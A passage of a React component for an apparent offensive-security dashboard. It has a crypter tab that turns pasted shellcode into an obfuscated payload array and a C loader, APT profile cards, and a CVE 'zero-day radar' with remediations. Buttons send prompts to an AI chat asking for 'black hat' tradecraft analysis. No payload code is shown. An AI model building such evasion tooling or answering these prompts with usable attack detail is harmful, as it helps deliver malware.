                        key={alg.id}
                        onClick={() => {
                          setCrypterAlgorithm(alg.id as any);
                        }}
                        className={`p-2 rounded-lg text-left border text-xs ${
                          crypterAlgorithm === alg.id
                            ? 'bg-red-950/60 border-red-500 text-red-200 font-bold'
                            : 'bg-zinc-950 border-zinc-800 text-zinc-400 hover:text-zinc-200'
                        }`}
                      >
                        <div>{alg.name}</div>
                        <div className="text-[9px] text-zinc-500">{alg.desc}</div>
                      </button>
                    ))}
                  </div>
                </div>

                <div>
                  <label className="text-[10px] text-zinc-500 block mb-1 uppercase font-semibold">
                    Raw Shellcode Input (Hex / Escaped)
                  </label>
                  <textarea
                    value={rawPayloadInput}
                    onChange={(e) => setRawPayloadInput(e.target.value)}
                    rows={4}
                    className="w-full bg-zinc-950 border border-zinc-800 rounded p-2 text-xs text-zinc-300 focus:border-red-500 outline-none font-mono resize-none"
                    placeholder="e.g. \x48\x31\xc9\x48\x81..."
                  />
                </div>

                <button
                  onClick={handleRunCrypter}
                  className="w-full py-2.5 rounded-lg bg-red-600 hover:bg-red-500 text-zinc-950 font-bold text-xs uppercase tracking-wider flex items-center justify-center gap-2 shadow-lg"
                >
                  <Zap className="w-3.5 h-3.5" />
                  Generate Obfuscated Stager & Loader
                </button>
              </div>
            </div>

            <div className="lg:col-span-7 space-y-4">
              <div className="rounded-xl border border-zinc-800 bg-black/90 overflow-hidden shadow-xl">
                <div className="bg-zinc-900/90 px-4 py-2 border-b border-zinc-800 flex items-center justify-between text-xs text-zinc-400 font-mono">
                  <span className="text-red-400 font-bold">Obfuscated Payload Array</span>
                  <button
                    onClick={() => handleCopy(encryptedOutput, 'enc')}
                    className="text-[11px] text-zinc-400 hover:text-zinc-200 flex items-center gap-1"
                  >
                    {copiedSection === 'enc' ? 'Copied!' : 'Copy Array'}
                  </button>
                </div>
                <div className="p-4 max-h-[200px] overflow-y-auto">
                  <pre className="text-xs text-emerald-400 font-mono whitespace-pre leading-relaxed">
                    {encryptedOutput || '// Click "Generate Obfuscated Stager" to compile'}
                  </pre>
                </div>
              </div>

              <div className="rounded-xl border border-zinc-800 bg-black/90 overflow-hidden shadow-xl">
                <div className="bg-zinc-900/90 px-4 py-2 border-b border-zinc-800 flex items-center justify-between text-xs text-zinc-400 font-mono">
                  <span className="text-cyan-400 font-bold">Native C Execution Loader</span>
                  <button
                    onClick={() => handleCopy(loaderCode, 'loader')}
                    className="text-[11px] text-zinc-400 hover:text-zinc-200 flex items-center gap-1"
                  >
                    {copiedSection === 'loader' ? 'Copied!' : 'Copy C Loader'}
                  </button>
                </div>
                <div className="p-4 max-h-[240px] overflow-y-auto">
                  <pre className="text-xs text-zinc-300 font-mono whitespace-pre leading-relaxed">
                    {loaderCode || '// Loader code will populate automatically'}
                  </pre>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* TAB 3: APT ADVERSARY DOSSIERS */}
        {activeTab === 'apt' && (
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            {aptProfiles.map((apt, idx) => (
              <div
                key={idx}
                className="p-5 rounded-xl bg-zinc-900/60 border border-zinc-800 hover:border-red-900/60 transition-all space-y-3 relative overflow-hidden group"
              >
                <div className="absolute top-0 right-0 w-32 h-32 bg-red-950/10 rounded-full blur-2xl group-hover:bg-red-950/20 transition-all"></div>
                <div className="flex items-center justify-between">
                  <span className="text-xs font-bold text-red-400 tracking-wider font-mono">
                    {apt.group}
                  </span>
                  <span className="text-[10px] text-zinc-500 font-mono uppercase bg-zinc-950 px-2 py-0.5 rounded border border-zinc-800">
                    {apt.origin}
                  </span>
                </div>

                <div className="text-xs text-zinc-300 space-y-2">
                  <div>
                    <span className="text-zinc-500 text-[11px] block">Target Sectors:</span>
                    <span>{apt.targets}</span>
                  </div>
                  <div>
                    <span className="text-zinc-500 text-[11px] block">Signature TTPs:</span>
                    <span className="text-red-300 font-mono">{apt.signatureTTPs}</span>
                  </div>
                  <div>
                    <span className="text-zinc-500 text-[11px] block">Covert C2 Architecture:</span>
                    <span className="text-cyan-300 font-mono">{apt.c2Protocol}</span>
                  </div>
                  <div>
                    <span className="text-zinc-500 text-[11px] block">Primary Evasion & Bypass:</span>
                    <span className="text-amber-300">{apt.primaryBypass}</span>
                  </div>
                </div>

                <div className="pt-2 border-t border-zinc-800/80 flex items-center justify-between">
                  <button
                    onClick={() => {
                      if (onExecuteInChat) {
                        onExecuteInChat(`Deconstruct and execute full adversary tradecraft analysis of ${apt.group}. Provide full initial access vectors, persistence mechanisms, and defensive detection rules.`);
                      }
                    }}
                    className="text-xs text-red-400 hover:text-red-300 font-semibold flex items-center gap-1"
                  >
                    <Terminal className="w-3 h-3" />
                    Execute Tradecraft in Chat
                  </button>
                  <span className="text-[10px] text-zinc-600 font-mono">MITRE G-CODE MAP</span>
                </div>
              </div>
            ))}
          </div>
        )}

        {/* TAB 4: ZERO-DAY RADAR */}
        {activeTab === 'zeroday' && (
          <div className="p-6 rounded-xl bg-zinc-900/70 border border-zinc-800 space-y-4">
            <div className="flex items-center justify-between">
              <div>
                <h3 className="text-sm font-bold text-zinc-100 flex items-center gap-2">
                  <Radio className="w-4 h-4 text-red-500 animate-pulse" />
                  Live Threat & Zero-Day Intelligence Radar
                </h3>
                <p className="text-xs text-zinc-400 mt-0.5">
                  Tracking active in-the-wild exploitation primitives, broker markets, and weaponized CVE chains.
                </p>
              </div>
              <span className="px-2.5 py-1 rounded bg-emerald-950 text-emerald-400 border border-emerald-800 text-xs font-mono">
                TELEMETRY FEED ACTIVE
              </span>
            </div>

            <div className="divide-y divide-zinc-800/80">
              {[
                {
                  id: "CVE-2024-38077",
                  name: "Windows Remote Desktop Licensing Service RCE (MadLicence)",
                  score: "9.8 CRITICAL",
                  vector: "Heap Buffer Overflow in RDLMSV.DLL",
                  status: "Weaponized Exploit PoCs Disclosed",
                  mitigation: "Disable Remote Desktop Licensing Service if unneeded; apply KB5040442 patch."
                },
                {
                  id: "CVE-2024-4577",
                  name: "PHP-CGI Windows Argument Injection (Bypass of CVE-2012-1823)",
                  score: "9.8 CRITICAL",
                  vector: "Best-Fit encoding collision in WideCharToMultiByte API",
                  status: "Actively Exploited by Ransomware Groups (TellYouThePass)",
                  mitigation: "Upgrade PHP to 8.3.8 / 8.2.20; enforce ModSecurity or WAF rewrite rules."
                },
                {
                  id: "CVE-2024-21413",
                  name: "Microsoft Outlook Moniker Link Security Feature Bypass (#MonikerLink)",
                  score: "9.8 CRITICAL",
                  vector: "OLE link parsing bypasses Protected View via 'file:///' hyperlink handling",
                  status: "Active In-The-Wild Nation-State Weaponization",
                  mitigation: "Block outbound SMB port 445; enforce Microsoft Office security updates."
                },
                {
                  id: "CVE-2024-1709",
                  name: "ConnectWise ScreenConnect Authentication Bypass",
                  score: "10.0 CRITICAL",
                  vector: "Path manipulation in SetupWizard.aspx allows unauthenticated administrative creation",
                  status: "Mass Exploitation & Immediate Cobalt Strike Delivery",
                  mitigation: "Upgrade ScreenConnect instances to version 23.9.8 immediately."
                }
              ].map((cve, i) => (
                <div key={i} className="py-4 flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
                  <div className="space-y-1">
                    <div className="flex items-center gap-2.5">
                      <span className="text-xs font-bold text-red-400 font-mono">{cve.id}</span>
                      <span className="px-1.5 py-0.2 rounded text-[10px] font-bold bg-red-950 text-red-300 border border-red-800 font-mono">
                        {cve.score}
                      </span>
                      <span className="text-xs font-semibold text-zinc-200">{cve.name}</span>
                    </div>
                    <div className="text-xs text-zinc-400">
                      <span className="text-zinc-500">Vector:</span> {cve.vector}
                    </div>
                    <div className="text-[11px] text-zinc-500">
                      <span className="text-emerald-500 font-semibold">Remediation:</span> {cve.mitigation}
                    </div>
                  </div>

                  <div className="flex items-center gap-2 shrink-0">
                    <button
                      onClick={() => {
                        if (onExecuteInChat) {
                          onExecuteInChat(`Perform an exhaustive black hat threat analysis of ${cve.id} (${cve.name}). Detail memory corruption mechanics, exploit prerequisites, and complete defense hardening steps.`);
                        }
                      }}
                      className="px-3 py-1.5 rounded bg-zinc-800 hover:bg-zinc-700 text-zinc-200 text-xs font-mono transition-all flex items-center gap-1.5"
                    >
                      <Terminal className="w-3 h-3 text-red-400" />
                      Investigate in Chat
                    </button>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

      </div>
    </div>
  );
};
